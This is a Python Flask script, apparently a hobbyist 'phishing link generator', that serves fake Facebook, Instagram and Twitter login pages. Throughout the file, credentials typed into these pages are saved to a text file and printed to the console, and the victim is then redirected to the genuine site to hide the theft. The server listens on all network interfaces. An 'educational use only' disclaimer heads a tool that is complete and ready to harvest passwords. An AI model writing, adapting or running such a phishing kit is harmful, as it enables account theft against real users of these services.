"""
=========================================
⚠️ Legal Disclaimer:

This script is for educational, ethical hacking, and cybersecurity awareness purposes only.

- Do not use for illegal phishing attacks.
- Only run this on systems you own or have permission to test.
- The author (p4cket-hunt3r) is not responsible for any misuse.

License: MIT (Attribution required, no warranty)
=========================================
"""

import os
import subprocess
import sys
from flask import Flask, request, redirect

# Auto-install Flask if not installed
try:
    from flask import Flask
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "flask"])
    from flask import Flask

app = Flask(__name__)
DATA_FILE = 'captured_data.txt'

# ANSI Color Codes
RED = '\033[91m'
GREEN = '\033[92m'
BLUE = '\033[94m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RESET = '\033[0m'

# Banner
def show_banner():
    print(f"{CYAN}")
    print("""
██████╗  ██████╗  ██████╗██╗  ██╗███████╗████████╗██╗  ██╗███╗   ██╗███╗   ███╗███████╗██████╗ 
██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝██║  ██║████╗  ██║████╗ ████║██╔════╝██╔══██╗
██████╔╝██║   ██║██║     █████╔╝ █████╗     ██║   ███████║██╔██╗ ██║██╔████╔██║█████╗  ██████╔╝
██╔═══╝ ██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   ██╔══██║██║╚██╗██║██║╚██╔╝██║██╔══╝  ██╔══██╗
██║     ╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   ██║  ██║██║ ╚████║██║ ╚═╝ ██║███████╗██║  ██║
╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
    """)
    print(f"{RESET}")
    print(f"{YELLOW}Author: p4cket-hunt3r | For Educational Purpose Only{RESET}\n")

# HTML Templates with Realistic Styles
templates = {
    "facebook": f"""
    <html><head><title>Facebook – Log In</title></head>
    <body style="font-family: Arial; background-color:#f0f2f5; text-align:center; padding-top:50px;">
        <h2 style="color:#1877f2;">Facebook</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Email or Phone" style="padding:10px; width:250px;"><br><br>
            <input type="password" name="password" placeholder="Password" style="padding:10px; width:250px;"><br><br>
            <input type="submit" value="Log In" style="padding:10px 20px; background-color:#1877f2; color:white; border:none;">
        </form>
    </body></html>
    """,

    "instagram": f"""
    <html><head><title>Instagram</title></head>
    <body style="font-family: Arial; background-color:#fafafa; text-align:center; padding-top:50px;">
        <h2 style="font-family:cursive;">Instagram</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" style="padding:10px; width:250px;"><br><br>
            <input type="password" name="password" placeholder="Password" style="padding:10px; width:250px;"><br><br>
            <input type="submit" value="Log In" style="padding:10px 20px; background-color:#0095f6; color:white; border:none;">
        </form>
    </body></html>
    """,

    "twitter": f"""
    <html><head><title>Login on Twitter</title></head>
    <body style="font-family: Arial; background-color:white; text-align:center; padding-top:50px;">
        <h2 style="color:#1DA1F2;">Twitter</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Phone, email, or username" style="padding:10px; width:250px;"><br><br>
            <input type="password" name="password" placeholder="Password" style="padding:10px; width:250px;"><br><br>
            <input type="submit" value="Log In" style="padding:10px 20px; background-color:#1DA1F2; color:white; border:none;">
        </form>
    </body></html>
    """
}

def save_and_print(platform, username, password):
    data_line = f"{platform} - Username: {username} | Password: {password}\n"
    with open(DATA_FILE, 'a') as f:
        f.write(data_line)
    print(f"{GREEN}[+] Captured Login:{RESET}")
    print(f"{YELLOW}{data_line}{RESET}")

@app.route('/')
def home():
    return """
    <h2>Phishing Link Generator - Localhost</h2>
    <p>Select a target page manually:</p>
    <ul>
        <li>/facebook/login.php</li>
        <li>/instagram/accounts/login/</li>
        <li>/twitter/session</li>
    </ul>
    """

@app.route('/facebook/login.php', methods=['GET', 'POST'])
def facebook_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        save_and_print('Facebook', username, password)
        return redirect('https://www.facebook.com/login.php')
    return templates['facebook']

@app.route('/instagram/accounts/login/', methods=['GET', 'POST'])
def instagram_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        save_and_print('Instagram', username, password)
        return redirect('https://www.instagram.com/accounts/login/')
    return templates['instagram']

@app.route('/twitter/session', methods=['GET', 'POST'])
def twitter_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        save_and_print('Twitter', username, password)
        return redirect('https://twitter.com/login')
    return templates['twitter']

def platform_selection():
    print(f"{BLUE}===== Platform Selection ====={RESET}")
    print(f"{CYAN}Choose a platform to launch phishing page:{RESET}")
    print(f"{YELLOW}1. Facebook")
    print(f"2. Instagram")
    print(f"3. Twitter{RESET}")
    choice = input(f"{GREEN}Enter your choice (1/2/3): {RESET}")

    if choice == '1':
        print(f"\n{GREEN}[+] Facebook fake page available at:{RESET}")
        print(f"{CYAN}http://127.0.0.1:5000/facebook/login.php{RESET}")
    elif choice == '2':
        print(f"\n{GREEN}[+] Instagram fake page available at:{RESET}")
        print(f"{CYAN}http://127.0.0.1:5000/instagram/accounts/login/{RESET}")
    elif choice == '3':
        print(f"\n{GREEN}[+] Twitter fake page available at:{RESET}")
        print(f"{CYAN}http://127.0.0.1:5000/twitter/session{RESET}")
    else:
        print(f"{RED}[-] Invalid choice. Exiting...{RESET}")
        sys.exit()

if __name__ == '__main__':
    if not os.path.exists(DATA_FILE):
        open(DATA_FILE, 'w').close()

    show_banner()
    platform_selection()
    print(f"\n{GREEN}[+] Starting Flask server on port 5000...{RESET}")
    app.run(host='0.0.0.0', port=5000)
